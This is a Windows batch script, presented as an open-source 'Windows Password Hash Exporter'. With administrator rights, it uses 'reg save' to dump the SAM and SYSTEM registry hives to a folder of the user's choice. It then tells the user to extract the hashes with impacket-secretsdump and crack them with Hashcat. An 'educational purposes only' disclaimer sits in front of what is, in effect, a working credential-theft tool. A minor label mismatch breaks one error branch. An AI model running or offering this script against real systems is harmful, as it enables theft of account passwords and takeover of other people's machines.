@echo off
setlocal
title Windows Password Hash Exporter
echo Program Name: Windows Password Hash Exporter
echo Version: 2.1.4
echo Developer: @YonatanReuvenIsraeli
echo Website: https://www.yonatanreuvenisraeli.dev
echo License: GNU General Public License v3.0
net session > nul 2>&1
if not "%errorlevel%"=="0" goto "NotAdministrator"
net user > nul 2>&1
if not "%errorlevel%"=="0" goto "WindowsRecoveryEnvironment"
goto "Disclaimer"

:"NotAdministrator"
echo.
echo Please run this batch file as an administrator. Press any key to close this batch file.
pause > nul 2>&1
goto "Close"

:"WindowsRecoverynEvironment"
echo.
echo Please do not run this batch file from Windows Recovery Environment. Press any key to close this batch file.
pause > nul 2>&1
goto :Close

:"Close"
endlocal
exit

:"Disclaimer"
echo.
echo READ DISCLAIMER ^-^-^> THIS IS FOR EDUCATIONAL PURPOSES ONLY! DO NOT USE THIS ON SOMEONE ELSES PC WITHOUT THEIR EXPLICIT PERMISSION! THIS IS A HACK! CONTINUE AT YOUR OWN RISK! WE HOLD NO RESPONSIBILITY FOR ANYTHING THAT HAPPEND, IS HAPPENING, AND/OR WILL HAPPEN BECAUSE OF THIS BATCH FILE!
echo.
set Disclaimer=
set /p Disclaimer="Do you agree to the Disclaimer? (Yes/No) "
if /i "%Disclaimer%"=="Yes" goto "Start"
if /i "%Disclaimer%"=="No" goto "Exit"
echo Invalid syntax!
goto "Disclaimer"

:"Start"
echo.
set HashPath=
set /p HashPath="Where do you want to save the Windows password hashes to? "
if not exist "%HashPath%" goto "HashPathNotExist"
goto "Export"

:"Export"
if exist "%HashPath%\Windows Password Hashes" goto "WindowsPasswordHashesExist"
md "%HashPath%\Windows Password Hashes"
reg save HKLM\SAM "%HashPath%\Windows Password Hashes\SAM.save"
reg save HKLM\SYSTEM "%HashPath%\Windows Password Hashes\SYSTEM.save"
echo.
echo Use impacket-secretsdump in Kali Linux to extract the hashes from "%HashPath%\Windows Password Hashes". You can then use a tool like Hashcat to crack the hash. Press any key to close this batch file.
pause > nul 2>&1
goto "Done"

:"HashPathNotExist"
echo "%HashPath%" does not exist. Please try again.
goto "Start"

:"WindowsPasswordHashesExist"
echo Please rename or move to another location "%HashPath%\Windows Password Hashes" in order for this batch file to proceed. Press any key to continue when you have renamed or moved "%HashPath%\Windows Password Hashes".
pause > nul 2>&1
goto "Export"

:"Done"
endlocal
exit
